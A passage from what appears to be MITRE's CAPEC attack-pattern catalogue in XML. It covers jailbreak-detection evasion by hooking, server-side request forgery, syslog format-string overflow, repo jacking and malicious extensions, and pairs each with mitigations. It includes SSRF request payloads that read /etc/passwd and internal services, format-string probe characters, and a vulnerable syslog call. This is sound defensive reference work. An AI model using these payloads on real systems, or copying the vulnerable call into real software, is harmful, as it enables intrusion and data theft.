               <ns0:Description>[Identify application with attack potential] The adversary searches for and identifies a mobile application that could be exploited for malicious purposes (e.g. banking, voting, or medical applications).</ns0:Description>
               <ns0:Technique>Search application stores for mobile applications worth exploiting</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>2</ns0:Step>
               <ns0:Phase>Experiment</ns0:Phase>
               <ns0:Description>[Develop code to be hooked into chosen target application] The adversary develops code or leverages existing code that will be hooked into the target application in order to evade Root/Jailbreak detection methods.</ns0:Description>
               <ns0:Technique>Develop code or leverage existing code to bypass Root/Jailbreak detection methods.</ns0:Technique>
               <ns0:Technique>Test the code to see if it works.</ns0:Technique>
               <ns0:Technique>Iteratively develop the code until Root/Jailbreak detection methods are evaded.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>3</ns0:Step>
               <ns0:Phase>Exploit</ns0:Phase>
               <ns0:Description>[Execute code hooking to evade Root/Jailbreak detection methods] Once hooking code has been developed or obtained, execute the code against the target application to evade Root/Jailbreak detection methods.</ns0:Description>
               <ns0:Technique>Hook code into the target application.</ns0:Technique>
            </ns0:Attack_Step>
         </ns0:Execution_Flow>
         <ns0:Prerequisites>
            <ns0:Prerequisite>The targeted application must be non-restricted to allow code hooking.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Skills_Required>
            <ns0:Skill Level="High">Knowledge about Root/Jailbreak detection and evasion techniques.</ns0:Skill>
            <ns0:Skill Level="Medium">Knowledge about code hooking.</ns0:Skill>
         </ns0:Skills_Required>
         <ns0:Resources_Required>
            <ns0:Resource>The adversary must have a Rooted/Jailbroken mobile device.</ns0:Resource>
            <ns0:Resource>The adversary needs to have enough access to the target application to control the included code or file.</ns0:Resource>
         </ns0:Resources_Required>
         <ns0:Consequences>
            <ns0:Consequence>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Scope>Authorization</ns0:Scope>
               <ns0:Impact>Execute Unauthorized Commands</ns0:Impact>
               <ns0:Note>Through Root/Jailbreak Detection Evasion via Hooking, the adversary compromises the integrity of the application.</ns0:Note>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Access Control</ns0:Scope>
               <ns0:Scope>Authorization</ns0:Scope>
               <ns0:Impact>Gain Privileges</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Access Control</ns0:Scope>
               <ns0:Impact>Read Data</ns0:Impact>
               <ns0:Note>An adversary may leverage Root/Jailbreak Detection Evasion via Hooking in order to obtain sensitive information.</ns0:Note>
            </ns0:Consequence>
         </ns0:Consequences>
         <ns0:Mitigations>
            <ns0:Mitigation>Ensure mobile applications are signed appropriately to avoid code inclusion via hooking.</ns0:Mitigation>
            <ns0:Mitigation>Inspect the application's memory for suspicious artifacts, such as shared objects/JARs or dylibs, after other Root/Jailbreak detection methods.</ns0:Mitigation>
            <ns0:Mitigation>Inspect the application's stack trace for suspicious method calls.</ns0:Mitigation>
            <ns0:Mitigation>Allow legitimate native methods, and check for non-allowed native methods during Root/Jailbreak detection methods.</ns0:Mitigation>
            <ns0:Mitigation>For iOS applications, ensure application methods do not originate from outside of Apple's SDK.</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Example_Instances>
            <ns0:Example>An adversary targets a non-restricted iOS banking application in an attempt to compromise sensitive user data. The adversary creates Objective-C runtime code that always returns "false" when checking for the existence of the Cydia application. The malicious code is then dynamically loaded into the application via the DYLD_INSERT_LIBRARIES environment variable. When the banking applications checks for Cydia, the hooked code returns "false", so the application assumes the device is stock (i.e. not Jailbroken) and allows it to access the application. However, the adversary has just evaded Jailbreak detection and is now able to glean user credentials and/or transaction details.</ns0:Example>
            <ns0:Example>An adversary targets a mobile voting application on an Android device with the goal of committing voter fraud. Leveraging the Xposed framework, the adversary is able to create and hook Java code into the application that bypasses Root detection methods. When the voting application attempts to detect a Rooted device by checking for commonly known installed packages associated with Rooting, the hooked code removes the suspicious packages before returning to the application. As a result, the application believes the device is stock (i.e. not Rooted) when in actuality this is not the case. Having evading Root detection, the adversary is now able to cast votes for the candidate of their choosing as a variety of different users.</ns0:Example>
         </ns0:Example_Instances>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="829" />
         </ns0:Related_Weaknesses>
         <ns0:Taxonomy_Mappings>
            <ns0:Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <ns0:Entry_ID>1055</ns0:Entry_ID>
               <ns0:Entry_Name>Process Injection</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
         </ns0:Taxonomy_Mappings>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-624" />
            <ns0:Reference External_Reference_ID="REF-625" />
            <ns0:Reference External_Reference_ID="REF-626" />
            <ns0:Reference External_Reference_ID="REF-627" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2020-12-17</ns0:Submission_Date>
            </ns0:Submission>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="664" Name="Server Side Request Forgery" Abstraction="Standard" Status="Stable">
         <ns0:Description>
            <html:p>An adversary exploits improper input validation by submitting maliciously crafted input to a target application running on a server, with the goal of forcing the server to make a request either to itself, to web services running in the server&#8217;s internal network, or to external third parties. If successful, the adversary&#8217;s request will be made with the server&#8217;s privilege level, bypassing its authentication controls. This ultimately allows the adversary to access sensitive data, execute commands on the server&#8217;s network, and make external requests with the stolen identity of the server. Server Side Request Forgery attacks differ from Cross Site Request Forgery attacks in that they target the server itself, whereas CSRF attacks exploit an insecure user authentication mechanism to perform unauthorized actions on the user's behalf.</html:p>
         </ns0:Description>
         <ns0:Likelihood_Of_Attack>High</ns0:Likelihood_Of_Attack>
         <ns0:Typical_Severity>High</ns0:Typical_Severity>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="115" />
         </ns0:Related_Attack_Patterns>
         <ns0:Execution_Flow>
            <ns0:Attack_Step>
               <ns0:Step>1</ns0:Step>
               <ns0:Phase>Explore</ns0:Phase>
               <ns0:Description>[Find target application] Find target web application that accepts a user input and retrieves data from the server</ns0:Description>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>2</ns0:Step>
               <ns0:Phase>Experiment</ns0:Phase>
               <ns0:Description>[Examine existing application requests] Examine HTTP/GET requests to view the URL query format. Adversaries test to see if this type of attack is possible through weaknesses in an application's protection to Server Side Request Forgery</ns0:Description>
               <ns0:Technique>Attempt manipulating the URL to retrieve an error response/code from the server to determine if URL/request validation is done.</ns0:Technique>
               <ns0:Technique>Use a list of XSS probe strings to specify as parameters to known URLs. If possible, use probe strings with unique identifiers.</ns0:Technique>
               <ns0:Technique>Create a GET request with a common server file path such as /etc/passwd as a parameter and examine output.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>3</ns0:Step>
               <ns0:Phase>Exploit</ns0:Phase>
               <ns0:Description>[Malicious request] Adversary crafts a malicious URL request that assumes the privilege level of the server to query internal or external network services and sends the request to the application</ns0:Description>
            </ns0:Attack_Step>
         </ns0:Execution_Flow>
         <ns0:Prerequisites>
            <ns0:Prerequisite>Server must be running a web application that processes HTTP requests.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Skills_Required>
            <ns0:Skill Level="Medium">The adversary will have to detect the vulnerability through an intermediary service or specify maliciously crafted URLs and analyze the server response.</ns0:Skill>
            <ns0:Skill Level="High">The adversary will be required to access internal resources, extract information, or leverage the services running on the server to perform unauthorized actions such as traversing the local network or routing a reflected TCP DDoS through them.</ns0:Skill>
         </ns0:Skills_Required>
         <ns0:Resources_Required>
            <ns0:Resource>[None] No specialized resources are required to execute this type of attack.</ns0:Resource>
         </ns0:Resources_Required>
         <ns0:Consequences>
            <ns0:Consequence>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>Modify Data</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Impact>Read Data</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>Resource Consumption</ns0:Impact>
            </ns0:Consequence>
         </ns0:Consequences>
         <ns0:Mitigations>
            <ns0:Mitigation>Handling incoming requests securely is the first line of action to mitigate this vulnerability. This can be done through URL validation.</ns0:Mitigation>
            <ns0:Mitigation>Further down the process flow, examining the response and verifying that it is as expected before sending would be another way to secure the server.</ns0:Mitigation>
            <ns0:Mitigation>Allowlist the DNS name or IP address of every service the web application is required to access is another effective security measure. This ensures the server cannot make external requests to arbitrary services.</ns0:Mitigation>
            <ns0:Mitigation>Requiring authentication for local services adds another layer of security between the adversary and internal services running on the server. By enforcing local authentication, an adversary will not gain access to all internal services only with access to the server.</ns0:Mitigation>
            <ns0:Mitigation>Enforce the usage of relevant URL schemas. By limiting requests be made only through HTTP or HTTPS, for example, attacks made through insecure schemas such as file://, ftp://, etc. can be prevented.</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Example_Instances>
            <ns0:Example>
               <html:p>An e-commerce website allows a customer to filter results by specific categories. When the customer selects the category of choice, the web shop queries a back-end service to retrieve the requested products. The request may look something like:</html:p>
               <html:div style="margin-left:1em;" class="informative">
                  <html:p>POST /product/category HTTP/1.0</html:p>
                  <html:p>Content-Type: application/x-www-form-urlencoded</html:p>
                  <html:p>Content-Length: 200</html:p>
                  <html:p>vulnerableService=http://vulnerableshop.net:8080/product/category/check%3FcategoryName%3DsomeCategory</html:p>
               </html:div>
               <html:p>A malicious user can modify the request URL to look like this instead:</html:p>
               <html:div style="margin-left:1em;" class="attack">
                  <html:p>POST /product/category HTTP/1.0</html:p>
                  <html:p>Content-Type: application/x-www-form-urlencoded</html:p>
                  <html:p>Content-Length: 200</html:p>
                  <html:p>vulnerableService=http://localhost/server-status</html:p>
               </html:div>
               <html:p>or</html:p>
               <html:div style="margin-left:1em;" class="attack">
                  <html:p>vulnerableService = file:///etc/passwd</html:p>
               </html:div>
               <html:p>or</html:p>
               <html:div style="margin-left:1em;" class="attack">
                  <html:p>vulnerableService=dict://localhost:12345/info</html:p>
               </html:div>
               <html:p>If the exploit is successful, the server may return the data requested by the adversary</html:p>
               <html:div style="margin-left:1em;" class="bad">
                  <html:p>root:!:0:0::/:/usr/bin/ksh</html:p>
                  <html:p>daemon:!:1:1::/etc:</html:p>
                  <html:p>bin:!:2:2::/bin:</html:p>
                  <html:p>sys:!:3:3::/usr/sys:</html:p>
                  <html:p>adm:!:4:4::/var/adm:</html:p>
                  <html:p>uucp:!:5:5::/usr/lib/uucp:</html:p>
                  <html:p>guest:!:100:100::/home/guest:</html:p>
                  <html:p>nobody:!:4294967294:4294967294::/:</html:p>
                  <html:p>lpd:!:9:4294967294::/:</html:p>
                  <html:p>lp:*:11:11::/var/spool/lp:/bin/false</html:p>
                  <html:p>invscout:*:200:1::/var/adm/invscout:/usr/bin/ksh</html:p>
                  <html:p>nuucp:*:6:5:uucp login user:/var/spool/uucppublic:/usr/sbin/uucp/uucico</html:p>
                  <html:p>paul:!:201:1::/home/paul:/usr/bin/ksh</html:p>
                  <html:p>jdoe:*:202:1:My name:/home/myname:/usr/bin/ksh</html:p>
               </html:div>
            </ns0:Example>
            <ns0:Example>
               <html:p>The CallStranger attack is an observed example of SSRF. It specifically targets the UPnP (Universal Plug and Play) protocol used by various network devices and gaming consoles. To execute the attack, an adversary performs a scan of the LAN to discover UPnP enabled devices, and subsequently a list of UPnP services they use. Once the UPnP service endpoints are listed, a vulnerability in the UPnP protocol is used to send these endpoints as encrypted to a verification server via the UPnP Callback method. Because the encryption is done on the client side, the server returns an encrypted list of services which is decrypted on the client side. The adversary then has a list of services running the vulnerable UPnP protocol, which the adversary can leverage to make spoofed requests. [REF-646]</html:p>
            </ns0:Example>
         </ns0:Example_Instances>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="918" />
            <ns0:Related_Weakness CWE_ID="20" />
         </ns0:Related_Weaknesses>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-644" />
            <ns0:Reference External_Reference_ID="REF-645" />
            <ns0:Reference External_Reference_ID="REF-646" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2021-06-24</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2021-10-21</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Execution_Flow</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-09-29</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Example_Instances</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="67" Name="String Format Overflow in syslog()" Abstraction="Detailed" Status="Draft">
         <ns0:Description>This attack targets applications and software that uses the syslog() function insecurely. If an application does not explicitely use a format string parameter in a call to syslog(), user input can be placed in the format string parameter leading to a format string injection attack. Adversaries can then inject malicious format string commands into the function call leading to a buffer overflow. There are many reported software vulnerabilities with the root cause being a misuse of the syslog() function.</ns0:Description>
         <ns0:Likelihood_Of_Attack>High</ns0:Likelihood_Of_Attack>
         <ns0:Typical_Severity>Very High</ns0:Typical_Severity>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="100" />
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="135" />
         </ns0:Related_Attack_Patterns>
         <ns0:Execution_Flow>
            <ns0:Attack_Step>
               <ns0:Step>1</ns0:Step>
               <ns0:Phase>Explore</ns0:Phase>
               <ns0:Description>[Identify target application] The adversary identifies a target application or program to perform the buffer overflow on. In this attack, adversaries look for applications that use syslog() incorrectly.</ns0:Description>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>2</ns0:Step>
               <ns0:Phase>Experiment</ns0:Phase>
               <ns0:Description>[Find injection vector] The adversary identifies an injection vector to deliver the excessive content to the targeted application's buffer. For each user-controllable input that the adversary suspects is vulnerable to format string injection, attempt to inject formatting characters such as %n, %s, etc.. The goal is to manipulate the string creation using these formatting characters.</ns0:Description>
               <ns0:Technique>Inject probe payload which contains formatting characters (%s, %d, %n, etc.) through input parameters.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>3</ns0:Step>
               <ns0:Phase>Experiment</ns0:Phase>
               <ns0:Description>[Craft overflow content] The adversary crafts the content to be injected. If the intent is to simply cause the software to crash, the content need only consist of an excessive quantity of random data. If the intent is to leverage the overflow for execution of arbitrary code, the adversary will craft a set of content that not only overflows the targeted buffer but does so in such a way that the overwritten return address is replaced with one of the adversaries' choosing which points to code injected by the adversary.</ns0:Description>
               <ns0:Technique>The formatting characters %s and %d are useful for observing memory and trying to print memory addresses. If an adversary has access to the log being written to they can observer this output and use it to help craft their attack.</ns0:Technique>
               <ns0:Technique>The formatting character %n is useful for adding extra data onto the buffer.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>4</ns0:Step>
               <ns0:Phase>Exploit</ns0:Phase>
               <ns0:Description>[Overflow the buffer] Using the injection vector, the adversary supplies the program with the crafted format string injection, causing a buffer.</ns0:Description>
            </ns0:Attack_Step>
         </ns0:Execution_Flow>
         <ns0:Prerequisites>
            <ns0:Prerequisite>The Syslog function is used without specifying a format string argument, allowing user input to be placed direct into the function call as a format string.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Consequences>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>Execute Unauthorized Commands</ns0:Impact>
               <ns0:Note>Run Arbitrary Code</ns0:Note>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>Unreliable Execution</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Access Control</ns0:Scope>
               <ns0:Scope>Authorization</ns0:Scope>
               <ns0:Impact>Gain Privileges</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Impact>Modify Data</ns0:Impact>
            </ns0:Consequence>
         </ns0:Consequences>
         <ns0:Mitigations>
            <ns0:Mitigation>
               <html:p>The code should be reviewed for misuse of the Syslog function call. Manual or automated code review can be used. The reviewer needs to ensure that all format string functions are passed a static string which cannot be controlled by the user and that the proper number of arguments are always sent to that function as well. If at all possible, do not use the %n operator in format strings. The following code shows a correct usage of Syslog():</html:p>
               <html:div style="margin-left:1em;" class="good">syslog(LOG_ERR, "%s", cmdBuf);</html:div>
               <html:p>The following code shows a vulnerable usage of Syslog():</html:p>
               <html:div style="margin-left:1em;" class="bad">syslog(LOG_ERR, cmdBuf);<html:div>
                     <html:i>// the buffer cmdBuff is taking user supplied data.</html:i>
                  </html:div>
               </html:div>
            </ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Example_Instances>
            <ns0:Example>Format string vulnerability in TraceEvent function for ntop before 2.1 allows remote adversaries to execute arbitrary code by causing format strings to be injected into calls to the syslog function, via (1) an HTTP GET request, (2) a user name in HTTP authentication, or (3) a password in HTTP authentication. See also: CVE-2002-0412</ns0:Example>
         </ns0:Example_Instances>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="120" />
            <ns0:Related_Weakness CWE_ID="134" />
            <ns0:Related_Weakness CWE_ID="74" />
            <ns0:Related_Weakness CWE_ID="20" />
            <ns0:Related_Weakness CWE_ID="680" />
            <ns0:Related_Weakness CWE_ID="697" />
         </ns0:Related_Weaknesses>
         <ns0:Taxonomy_Mappings>
            <ns0:Taxonomy_Mapping Taxonomy_Name="WASC">
               <ns0:Entry_ID>06</ns0:Entry_ID>
               <ns0:Entry_Name>Format String</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
         </ns0:Taxonomy_Mappings>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-1" />
            <ns0:Reference External_Reference_ID="REF-503" />
            <ns0:Reference External_Reference_ID="REF-504" />
            <ns0:Reference External_Reference_ID="REF-505" />
            <ns0:Reference External_Reference_ID="REF-506" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-01-09</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2018-07-31</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated References</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-07-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Execution_Flow</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2021-10-21</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Description, Execution_Flow, Prerequisites, Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-02-22</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Example_Instances</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-09-29</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Mitigations</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="695" Name="Repo Jacking" Abstraction="Detailed" Status="Stable">
         <ns0:Description>
            <html:p>An adversary takes advantage of the redirect property of directly linked Version Control System (VCS) repositories to trick users into incorporating malicious code into their applications.</html:p>
         </ns0:Description>
         <ns0:Extended_Description>
            <html:p>Software developers may directly reference a VCS repository (i.e., via a hardcoded URL) within source code to integrate the repository as a dependency for the underlying application. If the repository owner/maintainer modifies the repository name, changes their VCS username, or transfers ownership of the repository, the VCS implements a redirect to the new repository location so that existing software referencing the repository will not break. However, if the original location of the repository is reestablished, the VCS will revert to resolving the hardcoded path. Adversaries may, therefore, re-register deleted or previously used usernames and recreate repositories with malicious code to infect applications referencing the repository. When an application then fetches the desired dependency, it will now reference the adversary's malicious repository since the hardcoded repository path is once again active. This ultimately allows the adversary to infect numerous applications, while achieving a variety of negative technical impacts.</html:p>
         </ns0:Extended_Description>
         <ns0:Likelihood_Of_Attack>Medium</ns0:Likelihood_Of_Attack>
         <ns0:Typical_Severity>High</ns0:Typical_Severity>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="616" />
         </ns0:Related_Attack_Patterns>
         <ns0:Execution_Flow>
            <ns0:Attack_Step>
               <ns0:Step>1</ns0:Step>
               <ns0:Phase>Explore</ns0:Phase>
               <ns0:Description>[Identify target] The adversary must first identify a target repository that is commonly used and whose owner/maintainer has either changed/deleted their username or transferred ownership of the repository and then deleted their account. The target should typically be a popular and widely used package, as to increase the scope of the attack.</ns0:Description>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>2</ns0:Step>
               <ns0:Phase>Experiment</ns0:Phase>
               <ns0:Description>[Recreate initial repository path] The adversary re-registers the account that was renamed/deleted by the target repository's owner/maintainer and recreates the target repository with malicious code intended to exploit an application. These steps may need to happen in reverse (i.e., recreate repository and then rename an existing account to the target account) if protections are in place to prevent repository reuse.</ns0:Description>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>3</ns0:Step>
               <ns0:Phase>Exploit</ns0:Phase>
               <ns0:Description>[Exploit victims] The adversary's malicious code is incorporated into applications that directly reference the initial repository, which further allows the adversary to conduct additional attacks.</ns0:Description>
            </ns0:Attack_Step>
         </ns0:Execution_Flow>
         <ns0:Prerequisites>
            <ns0:Prerequisite>Identification of a popular repository that may be directly referenced in numerous software applications</ns0:Prerequisite>
            <ns0:Prerequisite>A repository owner/maintainer who has recently changed their username or deleted their account</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Skills_Required>
            <ns0:Skill Level="Low">Ability to create an account on a VCS hosting site and recreate an existing directory structure.</ns0:Skill>
            <ns0:Skill Level="Low">Ability to create malware that can exploit various software applications.</ns0:Skill>
         </ns0:Skills_Required>
         <ns0:Consequences>
            <ns0:Consequence>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Impact>Read Data</ns0:Impact>
               <ns0:Impact>Modify Data</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Access Control</ns0:Scope>
               <ns0:Scope>Authorization</ns0:Scope>
               <ns0:Impact>Execute Unauthorized Commands</ns0:Impact>
               <ns0:Impact>Alter Execution Logic</ns0:Impact>
               <ns0:Impact>Gain Privileges</ns0:Impact>
            </ns0:Consequence>
         </ns0:Consequences>
         <ns0:Mitigations>
            <ns0:Mitigation>Leverage dedicated package managers instead of directly linking to VCS repositories.</ns0:Mitigation>
            <ns0:Mitigation>Utilize version pinning and lock files to prevent use of maliciously modified repositories.</ns0:Mitigation>
            <ns0:Mitigation>Implement "vendoring" (i.e., including third-party dependencies locally) and leverage automated testing techniques (e.g., static analysis) to determine if the software behaves maliciously.</ns0:Mitigation>
            <ns0:Mitigation>Leverage automated tools, such as Checkmarx's "ChainJacking" tool, to determine susceptibility to Repo Jacking attacks.</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Example_Instances>
            <ns0:Example>
               <html:p>In May 2022, the CTX Python package and PhPass PHP package were both exploited by the same adversary via Repo Jacking attacks. For the CTX package, the adversary performed an account takeover via a password reset, due to an expired domain-hosting email. The attack on PhPass entailed bypassing GitHub's authentication for retired repositories. In both cases, sensitive data in the form of API keys and passwords, each stored in the form of environment variables, were exfiltrated. [REF-732] [REF-733]</html:p>
            </ns0:Example>
            <ns0:Example>
               <html:p>In October 2021, the popular JavaScript library UAParser.js was exploited via the takeover of the author's Node Package Manager (NPM) account. The adversary-provided malware downloaded and executed binaries from a remote server to conduct crypto-mining and to exfiltrate sensitive data on Windows systems. This was a wide-scale attack as the package receives 8 to 9 million downloads per week. [REF-732]</html:p>
            </ns0:Example>
         </ns0:Example_Instances>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="494" />
            <ns0:Related_Weakness CWE_ID="829" />
         </ns0:Related_Weaknesses>
         <ns0:Taxonomy_Mappings>
            <ns0:Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <ns0:Entry_ID>1195.001</ns0:Entry_ID>
               <ns0:Entry_Name>Supply Chain Compromise: Compromise Software Dependencies and Development Tools</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
         </ns0:Taxonomy_Mappings>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-722" />
            <ns0:Reference External_Reference_ID="REF-732" />
            <ns0:Reference External_Reference_ID="REF-733" />
            <ns0:Reference External_Reference_ID="REF-734" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2022-09-29</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2023-01-24</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Weaknesses</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="698" Name="Install Malicious Extension" Abstraction="Detailed" Status="Stable">
         <ns0:Description>
            <html:p>An adversary directly installs or tricks a user into installing a malicious extension into existing trusted software, with the goal of achieving a variety of negative technical impacts.</html:p>
         </ns0:Description>
         <ns0:Extended_Description>
            <html:p>Many software applications allow users to install third-party software extensions/plugins that provide additional features and functionality. Adversaries can take advantage of this behavior to install malware on a system with relative ease. This may require the adversary compromising a system and then installing the malicious extension themself. An alternate approach entails masquerading the malicious extension as a legitimate extension. The adversary then convinces users to install the malicious component, via means such as social engineering, or simply waits for victims to unknowingly install the malware on their systems. Once the malicious extension has been installed, the adversary can achieve a variety of negative technical impacts such as obtaining sensitive information, executing unauthorized commands, observing/modifying network traffic, and more.</html:p>
         </ns0:Extended_Description>
         <ns0:Likelihood_Of_Attack>Medium</ns0:Likelihood_Of_Attack>
         <ns0:Typical_Severity>High</ns0:Typical_Severity>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="542" />
         </ns0:Related_Attack_Patterns>
         <ns0:Execution_Flow>
            <ns0:Attack_Step>
               <ns0:Step>1</ns0:Step>
               <ns0:Phase>Explore</ns0:Phase>
               <ns0:Description>[Identify target(s)] The adversary must first identify target software that allows for extensions/plugins and which they wish to exploit, such as a web browser or desktop application. To increase the attack space, this will often be popular software with a large user-base.</ns0:Description>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>2</ns0:Step>
               <ns0:Phase>Experiment</ns0:Phase>
